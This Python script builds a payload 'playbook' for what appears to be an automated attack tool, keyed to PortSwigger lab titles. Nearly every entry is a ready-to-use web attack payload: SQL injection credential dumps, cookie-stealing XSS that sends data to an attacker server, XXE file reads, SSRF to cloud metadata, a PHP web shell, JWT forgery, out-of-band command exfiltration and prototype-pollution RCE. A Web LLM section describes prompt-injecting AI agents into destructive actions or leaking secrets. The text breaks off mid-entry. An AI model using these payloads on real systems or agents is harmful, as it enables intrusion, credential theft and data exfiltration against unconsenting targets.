#!/usr/bin/env python
"""
Seed data/playbook.json: ~20 PROVEN (this session) + ~14 KB payloads + 274
PortSwigger labs (titles parsed from the all-labs export; technique = my-own-words
trigger+payload+tell, NOT PortSwigger's prose). Labs without a confident
distillation get verify=True -> the human screenshot list.

Re-runnable: rebuilds from scratch (novelty-dedup makes it idempotent anyway).
"""
import os, sys, re, json
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core import playbook as pb

LABS = r"C:\Users\krnkk\Desktop\All labs.txt"

# PortSwigger category -> (stack hint, url slug)
SLUG = {
    "SQL injection": ("any/SQL-DB", "sql-injection"),
    "Cross-site scripting": ("any", "cross-site-scripting"),
    "Cross-site request forgery (CSRF)": ("any/session-cookie", "csrf"),
    "Clickjacking": ("any", "clickjacking"),
    "DOM-based vulnerabilities": ("SPA/JS", "dom-based"),
    "Cross-origin resource sharing (CORS)": ("any/CORS", "cors"),
    "XML external entity (XXE) injection": ("XML API", "xxe"),
    "Server-side request forgery (SSRF)": ("any/url-param", "ssrf"),
    "HTTP request smuggling": ("front-end+back-end", "request-smuggling"),
    "OS command injection": ("any", "os-command-injection"),
    "Server-side template injection": ("templating engine", "server-side-template-injection"),
    "Path traversal": ("any/file-param", "file-path-traversal"),
    "Access control vulnerabilities": ("any/auth", "access-control"),
    "Authentication": ("any/auth", "authentication"),
    "WebSockets": ("WebSocket app", "websockets"),
    "Web cache poisoning": ("cached app", "web-cache-poisoning"),
    "Insecure deserialization": ("PHP/Java/Ruby", "deserialization"),
    "Information disclosure": ("any", "information-disclosure"),
    "Business logic vulnerabilities": ("any", "logic-flaws"),
    "HTTP Host header attacks": ("any", "host-header"),
    "OAuth authentication": ("OAuth", "oauth"),
    "File upload vulnerabilities": ("any/upload", "file-upload"),
    "JWT": ("JWT auth", "jwt"),
    "Essential skills": ("any", "essential-skills"),
    "Prototype pollution": ("JS/Node", "prototype-pollution"),
    "GraphQL API vulnerabilities": ("GraphQL", "graphql"),
    "Race conditions": ("any", "race-conditions"),
    "NoSQL injection": ("Mongo/NoSQL", "nosql-injection"),
    "API testing": ("REST API", "api-testing"),
    "Web LLM attacks": ("LLM app", "llm-attacks"),
    "Web cache deception": ("cached app", "web-cache-deception"),
}

# title (lowercased, exact) -> (payload, tell). Missing = verify=True.
T = {
 # ---- SQL injection ----
 "sql injection vulnerability in where clause allowing retrieval of hidden data":
   ("category=Gifts'+OR+1=1--", "filter returns rows it shouldn't (e.g. unreleased products)"),
 "sql injection vulnerability allowing login bypass":
   ("username=administrator'--", "logged in as admin without the password"),
 "sql injection attack, querying the database type and version on oracle":
   ("' UNION SELECT banner,NULL FROM v$version--", "version banner reflected in response"),
 "sql injection attack, querying the database type and version on mysql and microsoft":
   ("' UNION SELECT @@version,NULL-- -", "version string reflected"),
 "sql injection attack, listing the database contents on non-oracle databases":
   ("' UNION SELECT table_name,NULL FROM information_schema.tables--", "table/column names + creds dumped"),
 "sql injection attack, listing the database contents on oracle":
   ("' UNION SELECT table_name,NULL FROM all_tables--", "Oracle table names reflected"),
 "sql injection union attack, determining the number of columns returned by the query":
   ("' ORDER BY 1-- (increment until error)  OR  ' UNION SELECT NULL,NULL--", "no-error point = column count"),
 "sql injection union attack, finding a column containing text":
   ("' UNION SELECT 'a',NULL,NULL--", "the column that renders 'a' is string-typed"),
 "sql injection union attack, retrieving data from other tables":
   ("' UNION SELECT username,password FROM users--", "creds appear in the response"),
 "sql injection union attack, retrieving multiple values in a single column":
   ("' UNION SELECT username||'~'||password,NULL FROM users--", "user~pass concatenated in one column"),
 "blind sql injection with conditional responses":
   ("xyz' AND 1=1--  vs  xyz' AND 1=2--", "1=1 shows 'Welcome back', 1=2 doesn't = boolean oracle"),
 "blind sql injection with conditional errors":
   ("'||(SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE '' END FROM dual)||'", "error vs no-error = boolean"),
 "visible error-based sql injection":
   ("' AND CAST((SELECT password FROM users LIMIT 1) AS int)--", "data leaked inside the SQL error message"),
 "blind sql injection with time delays":
   ("'||pg_sleep(10)--", "response hangs ~10s = injection confirmed"),
 "blind sql injection with time delays and information retrieval":
   ("'||(SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--",
    "delay when the guessed char is right -> extract char by char"),
 "sql injection with filter bypass via xml encoding":
   ("encode the UNION payload as XML entities: &#x53;ELECT ...", "WAF misses the entity-encoded SQL"),
 # ---- Cross-site scripting ----
 "reflected xss into html context with nothing encoded":
   ("<script>alert(1)</script>", "alert fires = script reflected unencoded"),
 "stored xss into html context with nothing encoded":
   ("<script>alert(1)</script> in a comment", "payload executes for every viewer of the page"),
 "dom xss in document.write sink using source location.search":
   ('"><svg onload=alert(1)>', "search param flows into document.write -> executes"),
 "dom xss in innerhtml sink using source location.search":
   ("<img src=x onerror=alert(1)>", "search value assigned to innerHTML -> img error fires"),
 "dom xss in jquery anchor href attribute sink using location.search source":
   ("javascript:alert(1)", "tainted href -> click runs JS"),
 "dom xss in jquery selector sink using a hashchange event":
   ("#<img src=x onerror=alert(1)>", "hashchange -> jQuery selector injects markup"),
 "reflected xss into attribute with angle brackets html-encoded":
   ('" autofocus onfocus=alert(1) x="', "break out of the attribute, no angle brackets needed"),
 "reflected xss into a javascript string with angle brackets html encoded":
   ("'-alert(1)-'", "break out of the JS string literal"),
 "reflected xss into html context with most tags and attributes blocked":
   ("<body onresize=alert(1)> + iframe sized to trigger resize", "custom event handler survives the filter"),
 "reflected xss into html context with all tags blocked except custom ones":
   ("<xss id=x onfocus=alert(1) tabindex=1>#x", "custom tag + autofocus via fragment"),
 "reflected xss with some svg markup allowed":
   ("<svg><animatetransform onbegin=alert(1)>", "allowed SVG element carries the handler"),
 "reflected xss in canonical link tag":
   ("'accesskey='x'onclick='alert(1)", "inject attributes into the canonical <link>"),
 "exploiting cross-site scripting to steal cookies":
   ("<script>fetch('//me/?c='+document.cookie)</script>", "victim cookie hits your server"),
 "exploiting cross-site scripting to capture passwords":
   ("inject a fake password form; on autofill exfiltrate", "browser autofills creds -> exfil"),
 "exploiting xss to bypass csrf defenses":
   ("XSS reads the CSRF token then submits the state-changing request", "action performed as victim"),
 "reflected xss with event handlers and href attributes blocked":
   ("<svg><a><animate attributeName=href values=javascript:alert(1)><text>x", "SVG animate sets href"),
 "reflected xss in a javascript url with some characters blocked":
   ("javascript:[].constructor.constructor('alert(1)')()", "build the call without blocked chars"),
 # ---- CSRF ----
 "csrf vulnerability with no defenses":
   ("auto-submitting <form> to the email-change endpoint", "victim's email changes on visit"),
 "csrf where token validation depends on request method":
   ("switch POST->GET, drop the token", "token only checked on POST -> GET bypasses"),
 "csrf where token validation depends on token being present":
   ("omit the csrf token param entirely", "missing token = not validated"),
 "csrf where token is not tied to user session":
   ("use your own valid token in the victim's request", "token accepted cross-user"),
 "csrf where token is tied to non-session cookie":
   ("set attacker token+cookie via a separate injection", "cookie/token pair both attacker-controlled"),
 "csrf where token is duplicated in cookie":
   ("set the csrf cookie=value and send same value as param", "double-submit accepts attacker value"),
 # ---- Clickjacking ----
 "basic clickjacking with csrf token protection":
   ("iframe target, opacity:0, decoy button under the real one", "victim click lands on hidden action"),
 "clickjacking with form input data prefilled from a url parameter":
   ("frame the page with prefilled URL params + decoy", "victim submits prefilled form"),
 "clickjacking with a frame buster script":
   ("sandbox=allow-forms on the iframe to neuter the buster", "framing succeeds despite buster"),
 # ---- CORS ----
 "cors vulnerability with basic origin reflection":
   ("Origin: evil.com -> reflected in ACAO with credentials", "cross-origin read of victim data"),
 "cors vulnerability with trusted null origin":
   ("Origin: null via sandboxed iframe", "null origin trusted -> exfil"),
 "cors vulnerability with trusted insecure protocols":
   ("subdomain over http with reflected origin", "MITM the http subdomain to read data"),
 # ---- XXE ----
 "exploiting xxe using external entities to retrieve files":
   ('<!DOCTYPE x[<!ENTITY xxe SYSTEM "file:///etc/passwd">]>&xxe;', "file contents in the response"),
 "exploiting xxe to perform ssrf attacks":
   ('<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">', "internal/metadata fetched"),
 "blind xxe with out-of-band interaction":
   ('<!ENTITY xxe SYSTEM "http://YOUR-OOB/">', "DNS/HTTP hit on your collaborator"),
 "exploiting xinclude to retrieve files":
   ('<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></x>',
    "XInclude pulls the file when you can't add a DOCTYPE"),
 "exploiting xxe via image file upload":
   ("upload a malicious SVG with an XXE entity", "server-side XML parse leaks the file"),
 # ---- SSRF ----
 "basic ssrf against the local server":
   ("stockApi=http://localhost/admin", "internal admin page returned"),
 "basic ssrf against another back-end system":
   ("stockApi=http://192.168.0.x:8080/admin", "back-end host reached via the proxy"),
 "ssrf with blacklist-based input filter":
   ("http://127.1/ or http://2130706433/ (decimal IP) or double-URL-encode", "filter bypassed, localhost hit"),
 "ssrf with filter bypass via open redirection vulnerability":
   ("point the param at an on-site open-redirect that 302s to the internal host", "redirect smuggles SSRF"),
 # ---- OS command injection ----
 "os command injection, simple case":
   ("productId=1|whoami", "command output appears in the response"),
 "blind os command injection with time delays":
   ("email=x||ping -c 10 127.0.0.1||", "response delayed ~10s = command ran"),
 "blind os command injection with output redirection":
   ("||whoami>/var/www/images/out.txt|| then fetch the file", "output written to a readable path"),
 "blind os command injection with out-of-band interaction":
   ("||nslookup YOUR-OOB|| (or curl)", "DNS/HTTP hit on collaborator"),
 # ---- SSTI ----
 "basic server-side template injection":
   ("${7*7} / {{7*7}} -> 49", "math evaluates = template injection; then RCE via the engine"),
 "basic server-side template injection (code context)":
   ("escape the existing expression context, then inject engine code", "code executes server-side"),
 # ---- Path traversal ----
 "file path traversal, simple case":
   ("filename=../../../etc/passwd", "file contents returned"),
 "file path traversal, traversal sequences blocked with absolute path bypass":
   ("filename=/etc/passwd", "absolute path bypasses the ../ filter"),
 "file path traversal, traversal sequences stripped non-recursively":
   ("filename=....//....//etc/passwd", "nested sequence survives one-pass strip"),
 "file path traversal, traversal sequences stripped with superfluous url-decode":
   ("filename=%252e%252e%252fetc/passwd", "double-encoded ../ decoded twice"),
 "file path traversal, validation of start of path":
   ("filename=/var/www/images/../../../etc/passwd", "start with the expected base then traverse"),
 "file path traversal, validation of file extension with null byte bypass":
   ("filename=../../../etc/passwd%00.png", "null byte truncates the required extension"),
 # ---- Access control ----
 "unprotected admin functionality":
   ("browse /administrator-panel (check robots.txt)", "admin panel loads without auth"),
 "unprotected admin functionality with unpredictable url":
   ("find the admin URL leaked in client-side JS", "hidden admin path reachable"),
 "user role controlled by request parameter":
   ("set admin=true / roleid=2 in request or cookie", "privilege granted by trusting client input"),
 "user role can be modified in user profile":
   ("add roleid:2 to the profile-update JSON", "mass-assignment escalates role"),
 "user id controlled by request parameter":
   ("change id= to another user's id", "IDOR -> other user's data"),
 "user id controlled by request parameter, with unpredictable user ids":
   ("harvest the victim GUID from a page, then use it", "IDOR with discovered id"),
 "user id controlled by request parameter with data leakage in redirect":
   ("request another id; data leaks in the redirect body before the 302", "leaked in response body"),
 "insecure direct object references":
   ("download/transcript?filename=2.txt -> iterate", "other users' files accessible"),
 "url-based access control can be circumvented":
   ("X-Original-URL: /admin (front-end path-based control)", "header overrides the URL check"),
 "method-based access control can be circumvented":
   ("change POST to GET (or other verb) on the admin action", "verb not covered by the control"),
 # ---- Authentication ----
 "username enumeration via different responses":
   ("compare login responses for valid vs invalid usernames", "different message reveals valid users"),
 "2fa simple bypass":
   ("complete step 1, then browse directly to the post-2FA page", "2FA step skippable"),
 "password reset broken logic":
   ("tamper the reset token/username param in the reset request", "reset another user's password"),
 "username enumeration via subtly different responses":
   ("diff tiny wording/length differences", "subtle delta enumerates users"),
 "username enumeration via response timing":
   ("valid user + long password -> slower response", "timing side-channel reveals valid users"),
 "broken brute-force protection, ip block":
   ("send X-Forwarded-For to reset the per-IP counter", "lockout bypassed"),
 "2fa broken logic":
   ("set the 2FA verify request's user to the victim after your own step1", "verify another account's code"),
 "brute-forcing a stay-logged-in cookie":
   ("cookie = base64(user:md5(pass)) -> offline brute the hash", "forge the persistent cookie"),
 "offline password cracking":
   ("steal the stay-logged-in cookie via XSS, crack the hash offline", "recover the password"),
 # ---- Information disclosure ----
 "information disclosure in error messages":
   ("trigger a stack trace (bad param type)", "version/framework leaked in the error"),
 "information disclosure on debug page":
   ("find /cgi-bin/phpinfo.php or a debug endpoint", "secrets/env in debug output"),
 "source code disclosure via backup files":
   ("request file.php~ or .bak (check /backup)", "source with DB creds disclosed"),
 "authentication bypass via information disclosure":
   ("TRACE/verbose response leaks the admin header to set", "use leaked header to reach admin"),
 "information disclosure in version control history":
   ("download /.git then git log -p / checkout", "secrets in commit history"),
 # ---- Business logic ----
 "excessive trust in client-side controls":
   ("tamper the price/quantity the client sends", "server trusts client value"),
 "high-level logic vulnerability":
   ("send negative quantity to reduce total", "logic flaw drops the price"),
 "inconsistent security controls":
   ("register with a normal email then change to @target-internal", "gain privileged role"),
 "flawed enforcement of business rules":
   ("stack two coupon codes / re-apply one", "discount applied beyond intent"),
 "low-level logic flaw":
   ("integer overflow the cart quantity to wrap the total", "price becomes tiny/negative"),
 # ---- File upload ----
 "remote code execution via web shell upload":
   ("upload shell.php (<?php system($_GET['c']); ?>) then call it", "command execution"),
 "web shell upload via content-type restriction bypass":
   ("set Content-Type: image/jpeg on the php upload", "type check bypassed -> RCE"),
 "web shell upload via path traversal":
   ("filename=../shell.php to escape the upload dir", "shell lands in an executable path"),
 "web shell upload via extension blacklist bypass":
   ("upload shell.php5 or .phtml, or an .htaccess to map a new ext", "blacklist bypassed"),
 "web shell upload via obfuscated file extension":
   ("shell.php%00.jpg or shell.php.jpg or trailing chars", "parser sees .php"),
 "remote code execution via polyglot web shell upload":
   ("embed PHP in image metadata so it passes image validation", "valid image + executes PHP"),
 # ---- JWT ----
 "jwt authentication bypass via unverified signature":
   ("change the payload (sub:administrator), keep/garble the signature", "server doesn't verify sig"),
 "jwt authentication bypass via flawed signature verification":
   ('set header alg:"none", drop the signature', "none algorithm accepted"),
 "jwt authentication bypass via weak signing key":
   ("brute the HMAC secret (hashcat -m 16500) then re-sign as admin", "forge a valid admin token"),
 "jwt authentication bypass via jwk header injection":
   ("embed your own jwk in the header, sign with your key", "server trusts the embedded key"),
 "jwt authentication bypass via jku header injection":
   ("host your JWKS, point jku at it", "server fetches attacker key set"),
 "jwt authentication bypass via kid header path traversal":
   ('kid: "../../../dev/null" and sign with an empty/known key', "kid loads a predictable key file"),
 # ---- NoSQL ----
 "detecting nosql injection":
   ("inject ' or \" or `'||'1'` into a param", "behaviour/error change confirms NoSQL"),
 "exploiting nosql operator injection to bypass authentication":
   ('username[$ne]= & password[$ne]=  OR  {"username":{"$ne":null},...}', "operator bypasses auth"),
 "exploiting nosql injection to extract data":
   ("username=admin' && this.password[0]=='a'||'", "boolean extraction of fields"),
 "exploiting nosql operator injection to extract unknown fields":
   ("$where / $regex to enumerate field names + values", "unknown fields disclosed"),
 # ---- GraphQL ----
 "accessing private graphql posts":
   ("query the post by id directly, ignore the isPublic flag", "private post returned"),
 "accidental exposure of private graphql fields":
   ("run an introspection query to list hidden fields", "sensitive fields in schema"),
 "finding a hidden graphql endpoint":
   ("probe /graphql /api /graphql/v1, send {__typename}", "endpoint responds to introspection"),
 "bypassing graphql brute force protections":
   ("alias many login mutations in ONE request", "rate limit (per-request) bypassed"),
 "performing csrf exploits over graphql":
   ("send the mutation as form-encoded POST (no preflight)", "GraphQL CSRF"),
 # ---- API testing ----
 "exploiting an api endpoint using documentation":
   ("read /openapi.json or /api/docs, hit the privileged endpoint", "documented admin action"),
 "exploiting server-side parameter pollution in a query string":
   ("inject %26 field2=val into a value to add a back-end param", "smuggle an extra API param"),
 "finding and exploiting an unused api endpoint":
   ("change Content-Type / method to reveal hidden API behaviour (OPTIONS)", "unused endpoint acts"),
 "exploiting a mass assignment vulnerability":
   ("add isAdmin:true (seen in GET) to the PATCH body", "extra field escalates"),
 # ---- Web LLM ----
 "exploiting llm apis with excessive agency":
   ("ask the LLM which APIs it can call, then have it call a dangerous one", "LLM invokes privileged API"),
 "indirect prompt injection":
   ("plant instructions in data the LLM later reads (review/email)", "LLM follows injected instructions"),
 "exploiting vulnerabilities in llm apis":
   ("get the LLM to call a backend API with injectable args (e.g. SQLi/cmd via the tool call)", "chained vuln via the LLM's API access"),
 "exploiting insecure output handling in llms":
   ("make the LLM emit <script>/markup that the page renders unescaped", "stored/reflected XSS via LLM output"),
 "exploiting ai agents to perform destructive actions":
   ("prompt-inject the agent to call a delete/transfer tool", "agent executes a harmful action"),
 "exploiting ai agents to exfiltrate sensitive information":
   ("inject 'send the secret to my URL' into agent-read content", "agent leaks data to attacker"),
 # ---- more XSS ----
 "dom xss in document.write sink using source location.search inside a select element":
   ("</select><img src=x onerror=alert(1)>", "break out of <select> then inject"),
 "dom xss in angularjs expression with angle brackets and double quotes html-encoded":
   ("{{$on.constructor('alert(1)')()}}", "AngularJS expression sandbox -> JS exec"),
 "reflected dom xss":
   ("eval-style sink reflects search param; inject \\\"-alert(1)}//", "JS executes from reflected DOM sink"),
 "stored dom xss":
   ("store <>'\"-breaking payload that a client-side sink later renders", "fires when victim views"),
 "reflected xss into a javascript string with single quote and backslash escaped":
   ("</script><script>alert(1)</script>", "escape the script block instead of the string"),
 "reflected xss into a javascript string with angle brackets and double quotes html-encoded and single quotes escaped":
   ("backslash-escaped quote is neutralised; use \\\\ then break: \\\\'-alert(1)//", "double-backslash restores the quote"),
 "stored xss into anchor href attribute with double quotes html-encoded":
   ("javascript:alert(1) in the href", "tainted href executes on click"),
 "stored xss into onclick event with angle brackets and double quotes html-encoded and single quotes and backslash escaped":
   ("&apos;-alert(1)-&apos; (HTML-entity the quote so it decodes in the handler)", "entity decodes inside onclick"),
 "reflected xss into a template literal with angle brackets, single, double quotes, backslash and backticks unicode-escaped":
   ("${alert(1)} — template-literal interpolation runs without quotes/backticks", "interpolation executes"),
 # ---- more CSRF (SameSite) ----
 "samesite lax bypass via method override":
   ("turn the POST into a GET (or _method=POST) so Lax allows top-level GET", "cross-site request sent"),
 "samesite strict bypass via client-side redirect":
   ("chain through an on-site client-side redirect to the action", "same-site context restored"),
 "samesite strict bypass via sibling domain":
   ("XSS/control a sibling subdomain to issue the same-site request", "sibling counts as same-site"),
 "samesite lax bypass via cookie refresh":
   ("force a top-level nav that refreshes the cookie within 2 min, then submit", "cookie sent on the request"),
 "csrf where referer validation depends on header being present":
   ("strip the Referer with <meta name=referrer content=no-referrer>", "no Referer = not validated"),
 "csrf with broken referer validation":
   ("put the target domain in your URL path/param so substring check passes", "weak Referer check fooled"),
 # ---- Clickjacking remaining ----
 "exploiting clickjacking vulnerability to trigger dom-based xss":
   ("frame the DOM-XSS URL, decoy the click onto the trigger element", "XSS fires via the framed click"),
 "multistep clickjacking":
   ("two stacked decoys to walk the victim through a 2-step action", "both steps clicked unknowingly"),
 # ---- DOM remaining ----
 "dom xss using web messages":
   ("postMessage a payload into a listener that writes to innerHTML", "message data hits the sink"),
 "dom xss using web messages and a javascript url":
   ("postMessage 'javascript:alert(1)' into a location-setting listener", "JS URL navigates/executes"),
 "dom xss using web messages and json.parse":
   ("postMessage JSON whose parsed field reaches a sink", "parsed value executes"),
 "dom-based open redirection":
   ("#https://evil.com where location is set from the fragment", "redirect to attacker host"),
 "dom-based cookie manipulation":
   ("inject a cookie value from a URL source that's later trusted", "tainted cookie used"),
 # ---- SSRF remaining ----
 "blind ssrf with out-of-band detection":
   ("Referer/param = http://YOUR-OOB", "DNS/HTTP hit on collaborator"),
 "ssrf with whitelist-based input filter":
   ("http://localhost@whitelisted-host / use # or embedded creds to fool the parser", "URL parser confusion -> internal hit"),
 # ---- XXE remaining ----
 "blind xxe with out-of-band interaction via xml parameter entities":
   ('<!ENTITY % p SYSTEM "http://YOUR-OOB/">%p;', "parameter entity triggers OOB"),
 "exploiting blind xxe to exfiltrate data using a malicious external dtd":
   ("host a DTD that reads a file and sends it to your server via a parameter entity", "file exfiltrated OOB"),
 "exploiting blind xxe to retrieve data via error messages":
   ("external DTD forces a parse error containing the file content", "data leaks in the error"),
 "exploiting xxe to retrieve data by repurposing a local dtd":
   ("redefine an entity from an existing local DTD to leak data via error", "no OOB needed"),
 # ---- OS cmd remaining ----
 "blind os command injection with out-of-band data exfiltration":
   ("||nslookup `whoami`.YOUR-OOB||", "command output prepended to the DNS lookup"),
 # ---- SSTI remaining ----
 "server-side template injection using documentation":
   ("identify the engine, read its docs for the RCE primitive (e.g. Freemarker exec)", "engine-specific RCE"),
 "server-side template injection in an unknown language with a documented exploit":
   ("fingerprint via error/probes, apply the documented payload", "known exploit fires"),
 "server-side template injection with information disclosure via user-supplied objects":
   ("inject an object accessor like {{settings.SECRET_KEY}}", "secret leaked via template"),
 # ---- Access control remaining ----
 "user role can be modified in user profile":
   ("add roleid:2 to the profile-update request", "mass-assignment escalates role"),
 "user id controlled by request parameter with password disclosure":
   ("view another user's profile; the password field is pre-filled in HTML", "password in the response"),
 "multi-step process with no access control on one step":
   ("skip to the privileged step's endpoint directly", "missing check on one step"),
 "referer-based access control":
   ("add Referer: <admin-page> to the privileged request", "control trusts the Referer"),
 # ---- Authentication remaining ----
 "username enumeration via account lock":
   ("only valid users get locked after N tries -> lock = valid", "lock behaviour enumerates"),
 "password reset poisoning via middleware":
   ("X-Forwarded-Host: evil.com so the reset link points to you", "victim's reset token sent to you"),
 "password brute-force via password change":
   ("the change-password form leaks current-password validity", "brute the current password there"),
 "2fa bypass using a brute-force attack":
   ("keep the session and brute the 4-digit code (macro to re-login)", "code guessed"),
 # ---- WebSockets ----
 "manipulating websocket messages to exploit vulnerabilities":
   ("intercept and inject <img onerror> into a chat WS message", "XSS via the WS message"),
 "cross-site websocket hijacking":
   ("open a WS from your page (no CSRF token/origin check) and read messages", "victim's WS data exfiltrated"),
 "manipulating the websocket handshake to exploit vulnerabilities":
   ("add X-Forwarded-For in the handshake to bypass an IP block, then inject", "handshake header trusted"),
 # ---- Host header ----
 "basic password reset poisoning":
   ("Host: evil.com -> reset link built from Host points to you", "token captured"),
 "host header authentication bypass":
   ("Host: localhost / internal to reach an admin restricted by Host", "internal-only page served"),
 "web cache poisoning via ambiguous requests":
   ("duplicate/ambiguous Host so cache keys one host but app uses the other", "poisoned cache entry"),
 "routing-based ssrf":
   ("Host: <internal-ip> on a reverse-proxy that routes by Host", "request routed to internal system"),
 "ssrf via flawed request parsing":
   ("absolute URL in the request line + Host mismatch", "front-end parses one host, routes another"),
 # ---- OAuth ----
 "authentication bypass via oauth implicit flow":
   ("change the email/sub in the token-submitted profile (implicit trusts client)", "log in as victim"),
 "forced oauth profile linking":
   ("CSRF the 'link account' step with your OAuth code", "attacker account linked to victim"),
 "oauth account hijacking via redirect_uri":
   ("redirect_uri=https://evil to steal the code", "code/token captured -> takeover"),
 "stealing oauth access tokens via an open redirect":
   ("chain redirect_uri -> on-site open redirect -> attacker", "token leaked via redirect chain"),
 # ---- Web cache poisoning (basics) ----
 "web cache poisoning with an unkeyed header":
   ("X-Forwarded-Host: evil -> reflected + cached", "all users served the poisoned response"),
 "web cache poisoning with an unkeyed cookie":
   ("set an unkeyed cookie that's reflected into the cached page", "cookie value poisons cache"),
 "web cache poisoning with multiple headers":
   ("combine two unkeyed headers (e.g. X-Forwarded-Host + X-Forwarded-Scheme)", "redirect/script poisoned"),
 "web cache poisoning via an unkeyed query string":
   ("the cache strips/ignores the query when keying, app reflects it", "query payload cached"),
 "web cache poisoning via an unkeyed query parameter":
   ("one specific param is unkeyed but reflected", "param poisons the keyed page"),
 "parameter cloaking":
   ("utm_content=x;param=evil — cache & app split the ; differently", "smuggled param poisons"),
 "web cache poisoning via a fat get request":
   ("GET with a body whose param the app prefers over the query", "body param poisons cache"),
 # ---- Deserialization (basics) ----
 "modifying serialized objects":
   ("flip admin=0 to admin=1 in the PHP/cookie serialized blob", "privilege via tampered object"),
 "modifying serialized data types":
   ("change a type (string->int) to abuse loose comparison (0==... )", "auth/loose-compare bypass"),
 "using application functionality to exploit insecure deserialization":
   ("set a serialized object's file field so __destruct deletes it", "app gadget triggers on unserialize"),
 "arbitrary object injection in php":
   ("supply a serialized object of a class with a dangerous magic method", "RCE/file op via magic method"),
 "exploiting java deserialization with apache commons":
   ("ysoserial CommonsCollections gadget -> base64 -> the cookie/param", "RCE via gadget chain"),
 "exploiting php deserialization with a pre-built gadget chain":
   ("phpggc to build the chain (e.g. Symfony/Monolog) -> inject", "RCE via prebuilt chain"),
 # ---- Race conditions ----
 "limit overrun race conditions":
   ("send the redeem/apply request many times in parallel (single packet)", "limit exceeded — coupon/credit reused"),
 "bypassing rate limits via race conditions":
   ("fire N login/OTP attempts simultaneously to beat the counter", "more attempts than allowed"),
 "multi-endpoint race conditions":
   ("hit add-to-cart and checkout in parallel to pay old price", "state inconsistency exploited"),
 "single-endpoint race conditions":
   ("parallel requests to one endpoint hit a TOCTOU window", "double-spend / dup effect"),
 # ---- Prototype pollution (client basics) ----
 "client-side prototype pollution via browser apis":
   ("?__proto__[gadget]=payload that a sink later reads", "polluted prototype reaches a gadget -> XSS"),
 "dom xss via client-side prototype pollution":
   ("__proto__[src]=data:,alert(1) gadget consumed by a script-loader sink", "XSS via polluted property"),
 "client-side prototype pollution via flawed sanitization":
   ("bypass the sanitizer with constructor.prototype or __pro__proto__to__", "pollution despite filter"),
 # ---- File upload remaining ----
 "web shell upload via race condition":
   ("upload the php shell and request it in the split-second before it's validated/deleted", "TOCTOU executes the shell"),
 # ---- Path-ish / info already covered above ----
 # ---- Web cache deception ----
 "exploiting path mapping for web cache deception":
   ("request /account/wcd.css (path segment maps to the dynamic page)", "victim's private page cached publicly"),
 "exploiting path delimiters for web cache deception":
   ("/account;foo.js — delimiter splits app path vs cache rule", "private response cached"),
 "exploiting origin server normalization for web cache deception":
   ("/account%2f%2e%2e%2fstatic.js style normalization mismatch", "cache stores private content"),
 "exploiting cache server normalization for web cache deception":
   ("encode the delimiter so only the cache normalizes it", "deception via cache-side normalize"),
 # ---- Essential skills ----
 "discovering vulnerabilities quickly with targeted scanning":
   ("Burp targeted scan on the one suspicious param instead of the whole site", "fast pinpoint finding"),
 "scanning non-standard data structures":
   ("place the scan insertion point inside a JSON/nested value", "scanner reaches the hidden param"),
 # ---- GraphQL / API already mostly covered ----
 # ---- Information disclosure already covered ----
 # ---- Business logic remaining ----
 "inconsistent handling of exceptional input":
   ("send an over-long / unexpected value to skip a validation branch", "logic bypass via odd input"),
 "weak isolation on dual-use endpoint":
   ("reuse a user-facing endpoint to change another field (e.g. set admin role)", "param the UI hides"),
 "insufficient workflow validation":
   ("jump straight to the confirm-order step, skipping payment", "order without paying"),
 "authentication bypass via flawed state machine":
   ("skip the role-selection step so you default to admin", "state machine mis-handles skip"),
 "infinite money logic flaw":
   ("buy a gift card with a store-credit code, redeem it, repeat", "credit loop nets infinite money"),
}

# ---- the 25 exotic, verified from PortSwigger solutions (user-supplied 2026-06-25) ----
T.update({
 "jwt authentication bypass via algorithm confusion":
   ("grab the RSA pubkey from /jwks.json; in JWT Editor import it, Copy Public Key as PEM, base64 it, "
    "make an HMAC key with k=that; set alg:HS256 + sub:administrator and sign with it",
    "server verifies HS256 using its RSA public key as the secret -> admin 200"),
 "jwt authentication bypass via algorithm confusion with no exposed key":
   ("no /jwks.json: run `docker run portswigger/sig2n <jwt1> <jwt2>` on two server tokens to recover the "
    "RSA public key (X.509), then do the HS256-sign-with-pubkey trick",
    "derived pubkey + HS256 sub:administrator accepted"),
 "ssrf via openid dynamic client registration":
   ('POST /reg (no auth) to register a client; set logo_uri to the internal target '
    '("http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"); server fetches it on '
    'GET /client/<client_id>/logo', "metadata/secret-key in the logo response"),
 "stealing oauth access tokens via a proxy page":
   ("redirect_uri path-traversal to an on-site page that postMessage's location.href to * "
    "(e.g. .../oauth-callback/../post/comment/comment-form); host an iframe with that URL + a message "
    "listener to exfil the token from the fragment", "victim's access token lands in your access log"),
 "privilege escalation via server-side prototype pollution":
   ('add {"__proto__":{"isAdmin":true}} to a JSON body the server deep-merges',
    "your account silently gains the polluted admin property"),
 "remote code execution via server-side prototype pollution":
   ('pollute a child_process spawn option: {"__proto__":{"execArgv":["--eval=require(\'child_process\')'
    '.execSync(\'rm ...\')"]}} so the next fork runs it', "command runs when the app forks a node child"),
 "detecting server-side prototype pollution without polluted property reflection":
   ('pollute a property with an observable SIDE EFFECT, e.g. {"__proto__":{"json spaces":10}} indents the '
    "JSON response, or override status/content-type", "server behaviour changes = pollution confirmed"),
 "bypassing flawed input filters for server-side prototype pollution":
   ('if __proto__ is stripped, use the constructor chain: {"constructor":{"prototype":{"isAdmin":true}}}',
    "same pollution via constructor.prototype"),
 "exfiltrating sensitive data via server-side prototype pollution":
   ("pollute an option that forces the server to emit data outbound (e.g. a shell/spawn arg or a config "
    "URL), capture on Collaborator", "sensitive data hits your OOB endpoint"),
 "dom xss via an alternative prototype pollution vector":
   ("use the DOT vector when [bracket] is blocked: /?__proto__.sequence=alert(1) — gadget is manager."
    "sequence passed to eval()", "alert fires via the eval sink"),
 "client-side prototype pollution in third-party libraries":
   ("use DOM Invader's prototype-pollution scan to find the source + gadget inside the bundled 3rd-party "
    "lib, then chain to the sink", "Invader reports source->gadget->sink -> XSS"),
 "reflected xss with angularjs sandbox escape without strings":
   ("?search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor."
    "fromCharCode(120,61,97,108,101,114,116,40,49,41)=1", "overwrites charAt to break the sandbox -> alert"),
 "reflected xss with angularjs sandbox escape and csp":
